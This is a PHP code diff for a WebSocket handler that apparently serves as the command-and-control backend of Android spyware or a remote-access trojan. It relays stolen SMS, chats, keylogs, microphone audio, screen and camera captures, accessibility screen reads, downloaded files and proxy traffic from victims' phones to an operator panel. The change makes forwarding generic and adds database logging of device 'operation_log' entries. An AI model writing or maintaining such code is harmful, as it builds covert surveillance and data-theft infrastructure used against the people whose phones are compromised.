@@ -53,8 +53,7 @@ final class DeviceHandler
         try {
             $this->heartbeatService->recordPing($phoneId);
 
-            $encodedData = $message->getString('msg');
-            $status = $this->deviceStatusService->updateFromPing($phoneId, $encodedData);
+            $this->deviceStatusService->updateFromPing($phoneId, $message->toArray());
 
             $phoneInfo = $this->deviceStatusService->formatForPanel($phoneId);
             $lastPing = LastPingFormatter::format($phoneInfo['lastPing'] ?? null);
@@ -77,144 +76,59 @@ final class DeviceHandler
 
     private function forwardToPanel(string $phoneId, WebSocketMessage $message): void
     {
-        $subc = $message->subc() ?? 'unknown';
+        $type = $message->getString('type', $message->subc() ?? 'unknown');
+
+        // Persist operation_log messages to database
+        if ($type === 'operation_log') {
+            $this->persistOperationLog($phoneId, $message);
+        }
 
         WebSocketLog::getLogger()->log(
-            DeviceForwardLogLevel::forSubc($subc)->toPsrLevel(),
-            "Device data forwarded: {$subc}", 
+            DeviceForwardLogLevel::forSubc($type)->toPsrLevel(),
+            "Device forwarded: {$type}",
             ['phone_id' => $phoneId]
         );
 
-        $panelData = match ($subc) {
-            // Standard msg-based messages
-            'sms', 'chat', 'files', 'savefiles', 'snap', 'loc', 'loadapps', 'loadcontacts', 'injapps' => [
-                'type' => $subc,
-                'data' => $message->getString('msg'),
-                'pid' => $phoneId,
-            ],
+        $raw = $message->toArray();
+        unset($raw['itype'], $raw['owner_token'], $raw['sessionId'], $raw['ws_connected']);
+        $raw['type'] = $type;
+        $raw['pid'] = $phoneId;
 
-            // klogs → type "klog" (note: different type name)
-            'klogs' => [
-                'type' => 'klog',
-                'data' => $message->getString('msg'),
-                'pid' => $phoneId,
-            ],
-
-            // klogsdate
-            'klogsdate' => [
-                'type' => 'klogsdate',
-                'data' => $message->getString('msg'),
-                'pid' => $phoneId,
-            ],
-
-            // thumb - adds path field
-            'thumb' => [
-                'type' => 'thumb',
-                'data' => $message->getString('msg'),
-                'pid' => $phoneId,
-                'path' => $message->getString('pth', 'null'),
-            ],
-
-            // mic - uses voip field instead of msg
-            'mic' => [
-                'type' => 'mic',
-                'data' => $message->getString('voip'),
-                'pid' => $phoneId,
-            ],
-
-            // screen/screenshot - uses img field, adds dimensions
-            'screen', 'screenshot' => [
-                'type' => $subc,
-                'data' => $message->getString('img'),
-                'pid' => $phoneId,
-                'wmob' => $message->getString('wmob'),
-                'hmob' => $message->getString('hmob'),
-            ],
-
-            // readScreen - accessibility node tree (text assist)
-            'readScreen' => [
-                'type' => 'readScreen',
-                'pid' => $phoneId,
-                'windowTitle' => $message->getString('windowTitle'),
-                'activePackage' => $message->getString('activePackage'),
-                'activeWindow' => $message->getString('activeWindow'),
-                'children' => $message->get('children') ?? [],
-            ],
-
-            // cam - uses img field
-            'cam' => [
-                'type' => 'cam',
-                'data' => $message->getString('img'),
-                'pid' => $phoneId,
-            ],
-
-            // srch - uses pths field, adds sfor
-            'srch' => [
-                'type' => 'srch',
-                'data' => $message->getString('pths', 'null'),
-                'pid' => $phoneId,
-                'sfor' => $message->getString('stype', 'null'),
-            ],
-
-            // down - file download with chunking
-            'down' => [
-                'type' => 'down',
-                'filename' => $message->getString('filename'),
-                'filedata' => $message->getString('filedata'),
-                'totalSize' => $message->get('totalSize', 0),
-                'sentSize' => $message->get('sentSize', 0),
-                'chunkNumber' => $message->get('chunkNumber', 0),
-                'filehash' => $message->getString('filehash'),
-                'filepath' => $message->getString('filepath'),
-                'pid' => $phoneId,
-            ],
-
-            // proxy - complex ctype-based logic
-            'proxy' => $this->buildProxyPanelData($phoneId, $message),
-
-            // Default fallback
-            default => [
-                'type' => $subc,
-                'pid' => $phoneId,
-            ],
-        };
-
-        $this->connectionManager->sendToPanels($phoneId, $panelData);
+        $this->connectionManager->sendToPanels($phoneId, $raw);
     }
 
-    private function buildProxyPanelData(string $phoneId, WebSocketMessage $message): array
+    private function persistOperationLog(string $phoneId, WebSocketMessage $message): void
     {
-        $ctype = $message->getString('ctype');
+        try {
+            $data = $message->get('data');
+            if (! is_array($data)) {
+                $data = $message->toArray();
+            }
 
-        return match ($ctype) {
-            'first' => [
-                'type' => 'proxy',
-                'pid' => $phoneId,
-                'calltype' => 'first',
-                'extip' => $this->connectionManager->getClientIp($phoneId) ?? '',
-                'locip' => $message->getString('loip'),
-                'pxport' => $message->getString('pport'),
-            ],
-            'state' => [
-                'type' => 'proxy',
-                'pid' => $phoneId,
-                'calltype' => 'state',
-                'pstate' => $message->getString('pxstate'),
-            ],
-            'dataup' => [
-                'type' => 'proxy',
-                'pid' => $phoneId,
-                'calltype' => 'dataup',
-                'ogip' => $message->getString('oip'),
-                'pxip' => $this->connectionManager->getClientIp($phoneId) ?? '',
-                'purl' => $message->getString('purl'),
-                'pmthod' => $message->getString('pmth'),
-            ],
-            default => [
-                'type' => 'proxy',
-                'pid' => $phoneId,
-                'calltype' => $ctype,
-            ],
-        };
+            $device = \App\Models\Device::where('device_uid', $phoneId)
+                ->orWhere('uuid', $phoneId)
+                ->first();
+
+            if (! $device) {
+                return;
+            }
+
+            $logType = $data['logType'] ?? $data['log_type'] ?? 'ACTZ';
+            $content = $data['content'] ?? json_encode($data);
+            $timestamp = $data['timestamp'] ?? null;
+
+            \App\Models\DeviceLog::create([
+                'device_id' => $device->id,
+                'user_id' => $device->user_id,
+                'log_type' => $logType,
+                'content' => $content,
+                'device_timestamp' => $timestamp
+                    ? \Carbon\Carbon::createFromTimestampMs((int) $timestamp)
+                    : now(),
+                'device_uid' => $phoneId,
+            ]);
+        } catch (\Throwable $e) {
+            WebSocketLog::getLogger()->warning("Failed to persist operation_log: {$e->getMessage()}");
+        }
     }
 }
